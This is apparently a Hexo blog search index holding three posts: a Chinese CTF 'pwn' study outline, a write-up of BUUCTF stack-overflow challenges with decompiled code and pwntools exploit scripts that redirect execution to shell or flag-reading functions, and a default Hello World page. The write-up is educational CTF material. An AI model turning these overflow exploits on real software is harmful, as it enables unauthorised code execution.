<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Scr1w_reply_brief</title>
    <link href="/2025/02/28/Scr1w_reply_brief/"/>
    <url>/2025/02/28/Scr1w_reply_brief/</url>
    
    <content type="html"><![CDATA[<h1 id="Scr1w答辩-2025"><a href="#Scr1w答辩-2025" class="headerlink" title="Scr1w答辩[2025]"></a>Scr1w答辩[2025]</h1><p><strong>[ 基础知识 ]</strong></p><p>调用栈的相关约定知识，栈的基本结构，内外平栈，调用函数的相关知识，汇编语言，栈溢出原理，系统调用，浮点数的存储[IEEE 754规则] ， C++ ， 二进制文件 ， Linux操作系统的基本命令 ， python的基本语法 ， pwntools利用 ，延迟绑定机制  ， tmux终端复用器 ，</p><p><strong>[ 已经有学习并且比较熟悉基本的漏洞 ]</strong></p><p>ret2text , ret2shellcode , ret2syscall , ret2libc , 格式化字符串 ，整数溢出 ，下标溢出 ，str函数的漏洞 [strlen]及相关函数的漏洞 ， canary绕过</p><p><strong>[有了解但不熟悉并目前准备学习]</strong></p><p>栈迁移 ，非格式化字符串漏洞 ，更多的gadget ，一些题解中的方法 ， 题解模板的学习利用 ,   srop ， ret2csu  ， io的劫持 ， </p><p><strong>[ 使用工具 ]</strong></p><p>pwngdb ， ROPgadget ， IDA Pro </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>stack_sum_up</title>
    <link href="/2025/02/28/WP/"/>
    <url>/2025/02/28/WP/</url>
    
    <content type="html"><![CDATA[<h1 id="不同类型的题目汇总"><a href="#不同类型的题目汇总" class="headerlink" title="不同类型的题目汇总"></a>不同类型的题目汇总</h1><p><strong><a href="https://buuoj.cn/challenges#rip">https://buuoj.cn/challenges#rip</a></strong> [ 最简单的rop ] </p><p>checksec:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/pwn1$ checksec pwn1<br>[*] &#x27;/mnt/d/scr1w/pwn1/pwn1&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No PIE (0x400000)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>IDA_main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+1h] [rbp-Fh] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input&quot;</span>);<br>  gets(s, argv);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok,bye!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_fun: [ backdoor_addr &#x3D; 0x401186 ] </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>计算溢出长度 [ 缓冲区长度+old_ebp长度 [ 由程序位数决定 ] ]最后再加上目标返回地址，即后门函数的首地址加一位</p><p>exploit：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import * <br><br>#r = remote(&#x27;IP&#x27;,port)<br>r = process(&#x27;./rip&#x27;)<br><br>fun_addr = 0x401186<br><br>payload1 = b&#x27;a&#x27; * ( 0xF + 0x8 ) + p64( fun_addr + 1 )<br><br>r.recvuntil(&#x27;please input\n&#x27;)<br>r.sendline(payload1)<br>r.interactive()<br></code></pre></td></tr></table></figure><p><strong><a href="https://buuoj.cn/challenges#ciscn_2019_n_1">https://buuoj.cn/challenges#ciscn_2019_n_1</a></strong> [ 浮点数在计算机中的存储方式 IEEE 754标准 ]</p><p>checksec:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/pwn3$ checksec ciscn_2019_n_1<br>[*] &#x27;/mnt/d/scr1w/pwn3/ciscn_2019_n_1&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>IDA_main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  func();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_func:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v1[<span class="hljs-number">44</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">float</span> v2; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = <span class="hljs-number">0.0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s guess the number.&quot;</span>);<br>  gets(v1);<br>  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">11.28125</span> )<br>    <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Its value should be 11.28125&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过get的溢出覆盖掉v2，使得v2满足条件后cat &#x2F;flag</p><p>exploit：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>#r = remote(&#x27;IP&#x27;,port)<br>r = process(&#x27;./ciscn_2019_n_1&#x27;)<br><br>payload1 = b&#x27;a&#x27; * 44  + p64(0x41348000)<br><br>r.sendline(payload1)<br>r.interactive()<br></code></pre></td></tr></table></figure><p><strong>IEEE 754规则</strong></p><p>float位数分配：</p><p>总共有32位，其中符号位1位，指数位8位，尾数位23位</p><p>double位数分配：</p><p>总共有64位，其中符号位1位，指数位11位，尾数位52位。</p><p>特殊值的表示：<br>零：当指数位和尾数位都为0时，表示数值0。正零的符号位为0，负零的符号位为1。<br>无穷大和无穷小：当指数位为全1，尾数位为0时，表示无穷大或无穷小。符号位为0表示正无穷大，符号位为1表示负无穷大。<br>NaN（Not a Number）：当指数位为全1，尾数位不为0时，表示NaN。NaN用于表示一些非法的数值操作结果，如0除以0等。 </p><p>以单精度浮点数计算3.14的表示举例说明：</p><p>3.14  其二进制表示为11.00100011110101110000101（取到足够精度）。</p><p>首先将其转换为科学计数法形式1.100100011110101110000101×2^1。</p><p>符号位为0（正数），</p><p>指数位为1+127（偏移量）&#x3D;128，</p><p>二进制表示为10000000。</p><p>尾数位去掉整数部分的1，保留小数部分，即100100011110101110000101。</p><p>最终存储为0 10000000 100100011110101110000101</p><p><strong>这其中小数部分转化为二进制步骤如下</strong></p><p>1.小数位0.14，0.14 * 2&#x3D;0.28，整数位为0，取0<br>2.小数位0.28，0.28 * 2&#x3D;0.56，整数位为0，取0<br>3.小数位0.56，0.56 * 2&#x3D;1.12，整数位为1，取1<br>4.小数位0.12，0.12 * 2&#x3D;0.24，整数位为0，取0</p><p>依次类推</p><p>指数位的计算：偏移量+二进制表示形式的指数<br>float型的偏移量为127，double的偏移量为1023</p><p>尾数位，去掉整数部分的1，就是尾数位</p><p><strong><a href="https://buuoj.cn/challenges#pwn1_sctf_2016">https://buuoj.cn/challenges#pwn1_sctf_2016</a></strong> [ C++语法 ]</p><p>checksec：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/pwn4$ checksec pwn1_sctf_2016<br>[*] &#x27;/mnt/d/scr1w/pwn4/pwn1_sctf_2016&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>IDA_main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_vuln:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-3Ch] BYREF</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+3Ch] [ebp-1Ch] BYREF</span><br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+40h] [ebp-18h] BYREF</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [esp+47h] [ebp-11h] BYREF</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+48h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">char</span> v7[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [esp+4Fh] [ebp-9h] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tell me something about yourself: &quot;</span>);<br>  <span class="hljs-built_in">fgets</span>(s, <span class="hljs-number">32</span>, edata);<br>  std::string::<span class="hljs-keyword">operator</span>=(&amp;input, s);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v5);<br>  std::string::<span class="hljs-built_in">string</span>(v4, <span class="hljs-string">&quot;you&quot;</span>, &amp;v5);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::<span class="hljs-built_in">allocator</span>(v7);<br>  std::string::<span class="hljs-built_in">string</span>(v6, <span class="hljs-string">&quot;I&quot;</span>, v7);<br>  <span class="hljs-built_in">replace</span>((std::string *)v3);<br>  std::string::<span class="hljs-keyword">operator</span>=(&amp;input, v3, v6, v4);<br>  std::string::~<span class="hljs-built_in">string</span>(v3);<br>  std::string::~<span class="hljs-built_in">string</span>(v6);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(v7);<br>  std::string::~<span class="hljs-built_in">string</span>(v4);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v5);<br>  v0 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)std::string::<span class="hljs-built_in">c_str</span>((std::string *)&amp;input);<br>  <span class="hljs-built_in">strcpy</span>(s, v0);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;So, %s\n&quot;</span>, s);<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_get_flag：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">get_flag</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>计算的溢出长度为 60+4 但是输入限制是60 ，根据函数逻辑 I 替换为 you 所以可以通过这个特性达到溢出64的目的</p><p>exploit：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import * <br><br><br>#r = remote(&#x27;IP&#x27;，port)<br>r = process(&#x27;./pwn1_sctf_2016&#x27;)<br><br>ret_addr = 0x08048F0D<br>payload1 = b&#x27;I&#x27; * 20 + b&#x27;a&#x27; * 4 + P32(ret_addr + 1)<br><br>r.sendline(payload1)<br>r.interactive()<br></code></pre></td></tr></table></figure><p><strong><a href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9B]PWN5">https://buuoj.cn/challenges#[第五空间2019决赛]PWN5</a></strong> [ 格式化字符串漏洞 ]</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/02/27/hello-world/"/>
    <url>/2025/02/27/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
